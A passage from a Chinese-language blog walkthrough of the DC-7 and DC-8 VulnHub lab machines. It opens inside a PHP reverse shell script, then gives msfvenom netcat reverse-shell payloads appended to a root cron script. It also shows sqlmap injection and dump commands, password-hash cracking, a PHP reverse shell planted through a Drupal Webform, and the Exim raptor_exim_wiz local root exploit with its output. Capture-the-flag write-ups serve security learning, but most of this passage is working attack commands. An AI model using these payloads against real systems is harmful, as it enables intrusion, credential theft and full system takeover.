won&apos;t</span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">	// Check for end of TCP connection</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		printit(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Check for end of STDOUT</span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		printit(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Wait until a command is end down $sock, or some</span><br><span class="line">	// command output is available on STDOUT or STDERR</span><br><span class="line">	$read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line"></span><br><span class="line">	// If we can read from the TCP socket, send</span><br><span class="line">	// data to process&apos;s STDIN</span><br><span class="line">	if (in_array($sock, $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;SOCK READ&quot;);</span><br><span class="line">		$input = fread($sock, $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;SOCK: $input&quot;);</span><br><span class="line">		fwrite($pipes[0], $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can read from the process&apos;s STDOUT</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	if (in_array($pipes[1], $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;STDOUT READ&quot;);</span><br><span class="line">		$input = fread($pipes[1], $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;STDOUT: $input&quot;);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// If we can read from the process&apos;s STDERR</span><br><span class="line">	// send data down tcp connection</span><br><span class="line">	if (in_array($pipes[2], $read_a)) &#123;</span><br><span class="line">		if ($debug) printit(&quot;STDERR READ&quot;);</span><br><span class="line">		$input = fread($pipes[2], $chunk_size);</span><br><span class="line">		if ($debug) printit(&quot;STDERR: $input&quot;);</span><br><span class="line">		fwrite($sock, $input);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line">// Like print, but does nothing if we&apos;ve daemonised ourself</span><br><span class="line">// (I can&apos;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">function printit ($string) &#123;</span><br><span class="line">	if (!$daemon) &#123;</span><br><span class="line">		print &quot;$string\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>现在本地打开监听，然后点击<code>Preview</code>，成功拿到shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br><span class="line">connect to [192.168.43.84] from (UNKNOWN) [192.168.43.29] 60104</span><br><span class="line">Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux</span><br><span class="line"> 13:28:32 up  2:52,  1 user,  load average: 0.01, 0.06, 0.03</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">dc7user  pts/0    192.168.43.84    12:33   34:56   0.25s  0.25s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&apos;t access tty; job control turned off</span><br><span class="line"></span><br><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line"></span><br><span class="line">www-data@dc-7:/$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<p>在确认无其他可利用信息之后，查看最初的<code>backups.sh</code>的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-7:/opt/scripts$ ls -l</span><br><span class="line">-rwxrwxr-x 1 root www-data 520 Aug 29 23:02 backups.sh</span><br></pre></td></tr></table></figure>
<p>文件拥有者为<code>root</code>，而root用户在<code>www-data组</code>内，说明我们当前的<code>www-data</code>用户拥有对该文件的所有权限（r、w、x）</p>
<p>现在就可以<code>滥用&quot;写&quot;权限</code>来完成提权，借助工具<code>msfvenom</code>，Kali端输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.43.84 lport=7373 R</span><br></pre></td></tr></table></figure>
<p>等待一段时间之后，<code>msfvenom</code>就会返回一段命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.43.84 lport=7373</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 91 bytes</span><br><span class="line">mkfifo /tmp/bqro; nc 192.168.43.84 7373 0&lt;/tmp/bqro | /bin/sh &gt;/tmp/bqro 2&gt;&amp;1; rm /tmp/bqro</span><br></pre></td></tr></table></figure>
<p>nc监听<code>7373</code>端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 7373</span><br><span class="line">listening on [any] 7373 ...</span><br></pre></td></tr></table></figure>
<p>然后复制刚才msfvenom返回的最后一行，加上<code>引号</code>，前面加<code>echo</code>，后面加<code>&gt;&gt; backups.sh</code>。然后在刚才拿到的靶机的shell中执行如下命令，然后什么都不用做了，等待连接就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/bqro; nc 192.168.43.84 7373 0&lt;/tmp/bqro | /bin/sh &gt;/tmp/bqro 2&gt;&amp;1; rm /tmp/bqro&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure>
<p>马上返回了<code>root</code>的shell，拿下flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 7373</span><br><span class="line">listening on [any] 7373 ...</span><br><span class="line">connect to [192.168.43.84] from (UNKNOWN) [192.168.43.29] 55244</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">theflag.txt</span><br><span class="line">cat theflag.txt</span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&apos;m sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>虚拟机平台：VMware Workstation Pro</p>
<p>攻击机：Kali（IP：192.168.43.84或192.168.0.111）</p>
<p>靶机：DC-8（IP：192.168.43.165或192.168.0.112）</p>
<h2 id="渗透测试-3"><a href="#渗透测试-3" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><code>nmap</code>扫描IP，开放<code>22</code>和<code>80</code>端口，访问80端口，还是<code>drupal框架</code></p>
<p>在点击左侧<code>Details</code>栏时，发现<code>URL</code>中的<code>nid</code>在改变</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-1.png" alt="8-1"></p>
<p>添加单引号后报错，直接给执行的语句，发现是整形注入</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-2.png" alt="8-2"></p>
<p><code>sqlmap</code>跑，直接跑出了数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.165/?nid=1 --dbs --batch</span><br></pre></td></tr></table></figure>
<blockquote>
<p>d7db<br>information_schema</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.165/?nid=1 -D d7db --tables --batch</span><br></pre></td></tr></table></figure>
<blockquote>
<p>…</p>
<p>users</p>
<p>users_roles</p>
<p>…</p>
</blockquote>
<p>选择<code>users</code>表，爆出<code>admin</code>的密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://192.168.43.165/?nid=1 -D d7db -T users --dump --batch</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>uid</th>
<th>name</th>
<th>pass</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</td>
</tr>
<tr>
<td>2</td>
<td>john</td>
<td>$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</td>
</tr>
</tbody>
</table>
<p><code>john</code>爆破密码（admin的没有出来，john的出来了）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi password_dc8.txt</span><br><span class="line"># 填入$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF</span><br><span class="line"># john password_dc8.txt</span><br><span class="line"></span><br><span class="line">root@Knlvre:~# vi password_dc8.txt </span><br><span class="line">root@Knlvre:~# john password_dc8.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 32768 for all loaded hashes</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist</span><br><span class="line">turtle           (?)</span><br><span class="line">1g 0:00:00:11 DONE 2/3 (2019-09-27 16:09) 0.08912g/s 99.10p/s 99.10c/s 99.10C/s tucker..utopia</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p><code>dirsearch</code>扫描登录目录，扫到<code>/user</code>，登录<code>john</code>的账号成功。点击上面的<code>Contact Us</code>，切换界面后点击<code>Webform -&gt; form settings</code>，选择<code>PHP code</code>，然后填入之前用的<code>reverse shell</code>（注意：在shell前面加上任意字符串，然后记得修改地址和端口），点击提交</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-3.png" alt="8-3"></p>
<p>先开启监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@Knlvre:~# nc -lvnp 3737</span><br><span class="line">listening on [any] 3737 ...</span><br></pre></td></tr></table></figure>
<p>然后回到<code>Contact us</code>主页面，随意填写基本内容，然后提交</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-4.png" alt="8-4"></p>
<p>再次回到Terminal，就拿到了shell。查找具有<code>SUID</code>权限的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>
<p>注意这个<code>exim4</code>，利用它来提权，查看版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/$ exim4 --version | head -1</span><br><span class="line">Exim version 4.89 #2 built 14-Jun-2017 05:03:07</span><br></pre></td></tr></table></figure>
<p>在<code>Exploit Database</code>里搜索<code>exim</code>，利用这篇：<a href="https://www.exploit-db.com/exploits/46996" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46996</a></p>
<p>由于<code>www-data</code>用户在当前目录下无写权限，所以切换到<code>/tmp</code>目录下，因为有写权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/$ ls -l</span><br><span class="line">...</span><br><span class="line">drwxr-xr-x   2 root root  4096 Sep  5 00:23 srv</span><br><span class="line">dr-xr-xr-x  13 root root     0 Sep 30 01:45 sys</span><br><span class="line">drwxrwxrwt   2 root root  4096 Oct  1 07:42 tmp</span><br><span class="line">drwxr-xr-x  10 root root  4096 Sep  5 00:23 usr</span><br><span class="line">drwxr-xr-x  12 root root  4096 Sep  5 00:32 var</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以直接<code>wget</code>刚才的地址，也可以下载到<code>Kali</code>上，然后开启临时Web服务下载到靶机上，但是当我<code>./</code>执行时一直报错：</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-5.png" alt="8-5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ wget http://192.168.0.111:7373/46996.sh</span><br><span class="line">--2019-10-01 08:16:21--  http://192.168.0.111:7373/46996.sh</span><br><span class="line">Connecting to 192.168.0.111:7373... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3706 (3.6K) [text/x-sh]</span><br><span class="line">Saving to: &apos;46996.sh&apos;</span><br><span class="line"></span><br><span class="line">46996.sh            100%[===================&gt;]   3.62K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2019-10-01 08:16:21 (28.9 MB/s) - &apos;46996.sh&apos; saved [3706/3706]</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ ls</span><br><span class="line">46996.sh</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ chmod 777 46996.sh</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ ./46996.sh</span><br><span class="line">bash: ./46996.sh: /bin/bash^M: bad interpreter: No such file or directory</span><br></pre></td></tr></table></figure>
<p>所以只能直接用<code>vi</code>命令直接写：点击如下图位置，复制弹出的内容，然后直接在靶机中新建文件，写入其中</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DC/8-6.png" alt="8-6"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ls</span><br><span class="line">raptor_exim_wiz.sh</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ vi raptor_exim_wiz.sh	#写入</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ ls</span><br><span class="line">raptor_exim_wiz.sh</span><br><span class="line"></span><br><span class="line">www-data@dc-8:/tmp$ chmod 777 raptor_exim_wiz.sh</span><br></pre></td></tr></table></figure>
<p>按照文档内的<code>Usage</code>，有两种方法来执行该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span><br><span class="line"># # id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<p>尝试过程中，第一种方法提权失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ./raptor_exim_wiz.sh -m setuid</span><br><span class="line">./raptor_exim_wiz.sh -m setuid</span><br><span class="line">./raptor_exim_wiz.sh: line 1: m_wiz: command not found</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Preparing setuid shell helper...</span><br><span class="line">Problems compiling setuid shell helper, check your gcc.</span><br><span class="line">Falling back to the /bin/sh method.</span><br><span class="line"></span><br><span class="line">Delivering setuid payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Tue, 01 Oct 2019 08:26:09 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with &quot;.&quot; on a line by itself</span><br><span class="line">250 OK id=1iF47N-0000O7-Uz</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 117208 Oct  1 08:26 /tmp/pwned</span><br><span class="line">$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
<p>尝试第二种方式时成功了，直接拿到了<code>root</code>权限，拿下flag</p>
<p>Ps:此处当然也可以反弹shell到Kali上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@dc-8:/tmp$ ./raptor_exim_wiz.sh -m netcat</span><br><span class="line">./raptor_exim_wiz.sh -m netcat</span><br><span class="line">./raptor_exim_wiz.sh: line 1: m_wiz: command not found</span><br><span class="line"></span><br><span class="line">raptor_exim_wiz - &quot;The Return of the WIZard&quot; LPE exploit</span><br><span class="line">Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"></span><br><span class="line">Delivering netcat payload...</span><br><span class="line">220 dc-8 ESMTP Exim 4.89 Tue, 01 Oct 2019 08:27:59 +1000</span><br><span class="line">250 dc-8 Hello localhost [::1]</span><br><span class="line">250 OK</span><br><span class="line">250 Accepted</span><br><span class="line">354 Enter message, ending with &quot;.&quot; on a line by itself</span><br><span class="line">250 OK id=1iF499-0000Oj-KW</span><br><span class="line">221 dc-8 closing connection</span><br><span class="line"></span><br><span class="line">Waiting 5 seconds...</span><br><span class="line">localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=113(Debian-exim) groups=113(Debian-exim)</span><br><span class="line"></span><br><span class="line">cd /root</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line">cat flag.txt</span><br><span class="line"></span><br><span class="line">Brilliant - you have succeeded!!!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888</span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888</span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888</span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888</span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888</span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P</span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;</span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and all those who have taken the time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">I&apos;m also sending out an especially big thanks to:</span><br><span class="line"></span><br><span class="line">@4nqr34z</span><br><span class="line">@D4mianWayne</span><br><span class="line">@0xmzfr</span><br><span class="line">@theart42</span><br><span class="line"></span><br><span class="line">This challenge was largely based on two things:</span><br><span class="line"></span><br><span class="line">1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.</span><br><span class="line">2. A suggestion from @theart42</span><br><span class="line"></span><br><span class="line">The answer to that question is...</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>Reference</strong></p>
<p><a href="https://www.anquanke.com/post/id/178958" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178958</a></p>
<p><a href="http://lanbainan.cn/2019/05/30/2019-05-30/" target="_blank" rel="noopener">http://lanbainan.cn/2019/05/30/2019-05-30/</a></p>
<p><a href="https://diaryof0x41.wordpress.com/2019/05/29/vulnhub-dc-6-walkthrough/" target="_blank" rel="noopener">https://diaryof0x41.wordpress.com/2019/05/29/vulnhub-dc-6-walkthrough/</a></p>
<p><a href="https://www.hackingarticles.in/dc7-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.hackingarticles.in/dc7-vulnhub-walkthrough/</a></p>
<p><a href="https://www.hackingarticles.in/dc8-vulnhub-walkthrough/" target="_blank" rel="noopener">https://www.hackingarticles.in/dc8-vulnhub-walkthrough/</a></p>

            </div>

            <!-- Post Comments -->
            
    <!-- 使用 DISQUS_CLICK -->
<div id="disqus-comment">
    <div id="disqus_thread"></div>

<!-- add animation -->
<style>
	.disqus_click_btn {
            line-height: 30px;
            margin: 0;
            min-width: 50px;
            padding: 0 14px;
            display: inline-block;
            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
            font-size: 14px;
            font-weight: 400;
            text-transform: uppercase;
            letter-spacing: 0;
            overflow: hidden;
            will-change: box-shadow;
            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
            outline: 0;
            cursor: pointer;
            text-decoration: none;
            text-align: center;
            vertical-align: middle;
            border: 0;
            background: rgba(158, 158, 158, .2);
            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
            color: #fff;
            background-color: #7EC0EE;
            text-shadow: 0
        }
</style>
	
<div class="btn_click_load" id="disqus_bt"> 
    <button class="disqus_click_btn">点击查看评论</button>
</div>

<!--
<script type="text/javascript">
$('.btn_click_load').click(function() {
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();

    document.getElementById('disqus_bt').style.display = "none";
});
</script>
-->
<script type="text/javascript">
    var disqus_config = function () {
        this.page.url = 'https://knlvre.github.io/2019/09/18/DC5-DC8靶机渗透测试/';  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'https://knlvre.github.io/2019/09/18/DC5-DC8靶机渗透测试/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
</script>

<script type="text/javascript">
    $('.btn_click_load').click(function() {  //click to load comments
        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document;
            var s = d.createElement('script');
            s.src = '//http-miccall-tech.disqus.com/embed.js';
            s.setAttribute('data-timestamp', + new Date());
            (d.head || d.body).appendChild(s);
        })();
        $('.btn_click_load').css('display','none');
    });
</script>
</div>
<style>
    #disqus-comment{
        background-color: #eee;
        padding: 2pc;
    }
</style>


        </div>
        <!-- Copyright 版权 start -->
                <div id="copyright">
            <ul>
                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
            </ul>
            
                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
			
        </div>
    </div>
</body>



 	
</html>
